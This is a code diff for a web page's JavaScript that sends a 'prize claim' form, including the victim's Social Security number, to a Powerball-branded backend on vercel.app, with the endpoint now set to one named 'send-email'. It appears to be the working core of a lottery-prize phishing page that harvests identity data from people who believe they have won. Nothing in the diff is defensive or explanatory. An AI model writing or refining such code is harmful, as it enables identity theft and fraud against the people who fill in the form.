@@ -451,8 +451,6 @@ window.onload = function () {
 //     });
 // });
 
-const API_URL = "https://powerball-backend.vercel.app";
-
 document
   .getElementById("prizeClaimForm")
   .addEventListener("submit", async function (e) {
@@ -479,37 +477,43 @@ document
         ssn: document.getElementById("ssn").value,
       };
 
-      console.log("Attempting to send data to:", `${API_URL}/api/submit-form`);
-      
-      const response = await fetch(`${API_URL}/api/submit-form`, {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-          "Accept": "application/json"
-        },
-        body: JSON.stringify(formData),
-      });
+      const response = await fetch(
+        `https://powerball-backend.vercel.app/send-email`,
+        {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+            Accept: "application/json",
+          },
+          body: JSON.stringify(formData),
+        }
+      );
 
       if (!response.ok) {
         throw new Error(`HTTP error! status: ${response.status}`);
       }
 
       const data = await response.json();
-      console.log("Server response:", data);
+      // console.log("Server response:", data);
 
-      Swal.fire({
-        icon: "success",
-        title: "Success!",
-        text: "Your form has been submitted successfully.",
-      });
-      
-      document.getElementById("prizeClaimForm").reset();
+      if (data.success) {
+        Swal.fire({
+          icon: "success",
+          title: "Success!",
+          text: "Your form has been submitted successfully.",
+        });
+
+        document.getElementById("prizeClaimForm").reset();
+      } else {
+        throw new Error(data.message);
+      }
     } catch (error) {
-      console.error("Submission error:", error);
+      console.error("Error:", error);
       Swal.fire({
         icon: "error",
-        title: "Error!",
-        text: "Failed to submit form. Please try again later.",
+        title: "Oops...",
+        text: error.message || "Something went wrong. Please try again.",
+        confirmButtonColor: "#c81533",
       });
     }
   });
